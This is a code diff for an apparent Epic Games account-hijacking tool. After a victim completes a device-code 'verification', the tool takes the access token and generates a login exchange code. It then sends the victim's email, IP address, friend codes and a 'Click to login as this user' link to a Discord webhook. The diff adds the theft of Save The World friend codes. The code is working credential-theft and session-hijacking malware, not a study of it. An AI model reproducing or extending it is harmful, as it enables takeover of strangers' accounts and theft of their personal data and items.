@@ -112,6 +112,33 @@ async def get_exchange_code(access_token):
     except Exception as e:
         logger.error(f"❌ Exception while getting exchange code: {e}"); return None
 
+async def get_stw_codes(access_token, account_id):
+    """Fetches Save The World friend codes for multiple platforms."""
+    logger.info(f"[{account_id[:8]}] Fetching STW friend codes...")
+    platforms = ['epic', 'psn', 'xbox']
+    all_codes = []
+    headers = {"Authorization": f"Bearer {access_token}"}
+    
+    async with aiohttp.ClientSession() as sess:
+        for platform in platforms:
+            url = f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/friendcodes/{account_id}/{platform}"
+            try:
+                async with sess.get(url, headers=headers) as r:
+                    if r.status == 200:
+                        codes = await r.json()
+                        if codes:
+                            logger.info(f"[{account_id[:8]}] Found {len(codes)} code(s) for {platform.upper()}")
+                            for code in codes:
+                                all_codes.append(f"{platform.upper()}: `{code['codeId']}`")
+                        else:
+                            logger.info(f"[{account_id[:8]}] No STW codes found for platform: {platform.upper()}")
+                    else:
+                        logger.warning(f"[{account_id[:8]}] Failed to fetch STW codes for {platform.upper()}, status: {r.status}")
+            except Exception as e:
+                logger.error(f"[{account_id[:8]}] Exception fetching STW codes for {platform.upper()}: {e}")
+                
+    return all_codes
+
 async def auto_refresh_session(session_id, user_ip):
     """Reliably refreshes the exchange code for the lifetime of the access token (approx. 2 hours)."""
     try:
@@ -179,13 +206,19 @@ async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_i
                     token_resp = await r.json()
                     if "access_token" in token_resp:
                         logger.info(f"[{verify_id}] ✅ USER LOGGED IN!")
-                        async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r2: exchange_data = await r2.json()
-                        async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{token_resp['account_id']}", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r3: account_info = await r3.json()
+                        access_token = token_resp['access_token']
+                        account_id = token_resp['account_id']
                         
+                        async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"}) as r2: exchange_data = await r2.json()
+                        async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{account_id}", headers={"Authorization": f"bearer {access_token}"}) as r3: account_info = await r3.json()
+                        
+                        # Fetch STW codes
+                        stw_codes = await get_stw_codes(access_token, account_id)
+
                         session_id = str(uuid.uuid4())[:8]
                         with session_lock:
                             active_sessions[session_id] = {
-                                'access_token': token_resp['access_token'],
+                                'access_token': access_token,
                                 'account_info': account_info,
                                 'user_ip': user_ip,
                                 'created_at': time.time(),
@@ -194,7 +227,7 @@ async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_i
                                 'expires_at': time.time() + token_resp.get('expires_in', 7200)
                             }
                         
-                        asyncio.run_coroutine_threadsafe(send_login_success(session_id, account_info, exchange_data['code'], user_ip), main_event_loop)
+                        asyncio.run_coroutine_threadsafe(send_login_success(session_id, account_info, exchange_data['code'], user_ip, stw_codes), main_event_loop)
                         asyncio.run_coroutine_threadsafe(auto_refresh_session(session_id, user_ip), main_event_loop)
                         return
     except Exception as e:
@@ -209,10 +242,35 @@ async def send_webhook_message(webhook_url, payload):
     except Exception as e:
         logger.error(f"❌ Webhook error: {e}")
 
-async def send_login_success(session_id, account_info, exchange_code, user_ip):
+async def send_login_success(session_id, account_info, exchange_code, user_ip, stw_codes):
     display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
     login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
-    embed = {"title": "✅ User Logged In Successfully", "description": f"**{display_name}** has completed verification!\n\n🔄 *Session will now refresh for approx. 2 hours.*", "color": 3066993, "fields": [{"name": "Display Name", "value": display_name, "inline": True}, {"name": "Email", "value": email, "inline": True}, {"name": "Account ID", "value": f"`{account_id}`", "inline": False}, {"name": "IP Address", "value": f"`{user_ip}`", "inline": False}, {"name": "Session ID", "value": f"`{session_id}`", "inline": False}, {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False}, {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}], "footer": {"text": f"Link uses: {verification_uses} | Auto-Refresh: ON (2-hour window)"}, "timestamp": datetime.utcnow().isoformat()}
+    
+    fields = [
+        {"name": "Display Name", "value": display_name, "inline": True},
+        {"name": "Email", "value": email, "inline": True},
+        {"name": "Account ID", "value": f"`{account_id}`", "inline": False},
+        {"name": "IP Address", "value": f"`{user_ip}`", "inline": False},
+        {"name": "Session ID", "value": f"`{session_id}`", "inline": False}
+    ]
+
+    if stw_codes:
+        codes_value = "\n".join(stw_codes) if stw_codes else "None found."
+        fields.append({"name": "🔑 Save The World Codes", "value": codes_value, "inline": False})
+
+    fields.extend([
+        {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False},
+        {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}
+    ])
+    
+    embed = {
+        "title": "✅ User Logged In Successfully", 
+        "description": f"**{display_name}** has completed verification!\n\n🔄 *Session will now refresh for approx. 2 hours.*", 
+        "color": 3066993, 
+        "fields": fields, 
+        "footer": {"text": f"Link uses: {verification_uses} | Auto-Refresh: ON (2-hour window)"}, 
+        "timestamp": datetime.utcnow().isoformat()
+    }
     await send_webhook_message(DISCORD_WEBHOOK_URL, {"embeds": [embed]})
 
 async def send_refresh_update(session_id, account_info, exchange_code, user_ip, refresh_count):
